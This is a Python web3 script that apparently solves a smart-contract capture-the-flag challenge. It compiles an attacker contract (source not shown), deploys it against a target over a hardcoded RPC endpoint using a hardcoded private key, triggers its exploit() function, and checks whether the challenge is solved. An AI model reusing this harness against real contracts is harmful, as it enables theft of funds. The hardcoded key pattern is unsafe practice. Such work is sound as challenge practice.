from web3 import Web3
from solcx import install_solc, compile_files

# ==============================
# CONFIGURATION
# ==============================
RPC_URL = "http://83.136.251.194:33792"  
PRIVATE_KEY = "0x9c3b15ca16d56db1b82b24c6b0446578d3baf71850f057e100dc79c45db7271f"
TARGET_ADDRESS = "0x0EA98ad46420015458936ee12Db6ac061E6E9955"
SETUP_ADDRESS = "0xcB94aB9652201B5581D0c1ebfC5Ee9d4a21CDE07"

# ==============================
# COMPILE CONTRACTS
# ==============================
install_solc('0.8.28')

compiled = compile_files(
    ['Attacker.sol'],
    solc_version='0.8.28',
    output_values=['abi', 'bin']
)

attacker_contract = compiled['Attacker.sol:Attacker']

# ==============================
# SETUP WEB3
# ==============================
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)
print(f"Using account: {account.address}")

# ==============================
# DEPLOY ATTACKER CONTRACT
# ==============================
Attacker = w3.eth.contract(
    abi=attacker_contract['abi'],
    bytecode=attacker_contract['bin']
)

construct_txn = Attacker.constructor(TARGET_ADDRESS).build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price
})

signed_txn = account.sign_transaction(construct_txn)
tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

attacker_address = tx_receipt['contractAddress']
print(f"Attacker deployed at: {attacker_address}")

# ==============================
# EXECUTE EXPLOIT
# ==============================
attacker = w3.eth.contract(
    address=attacker_address,
    abi=attacker_contract['abi']
)

exploit_txn = attacker.functions.exploit().build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 500000,
    'gasPrice': w3.eth.gas_price
})

signed_exploit = account.sign_transaction(exploit_txn)
exploit_hash = w3.eth.send_raw_transaction(signed_exploit.raw_transaction)
exploit_receipt = w3.eth.wait_for_transaction_receipt(exploit_hash)

print("Exploit transaction hash:", exploit_receipt.transactionHash.hex())

# ==============================
# VERIFY SOLUTION
# ==============================
setup_abi = [{
    "inputs": [],
    "name": "isSolved",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "view",
    "type": "function"
}]

setup = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)
result = setup.functions.isSolved().call()
print(f"Challenge solved: {result}")
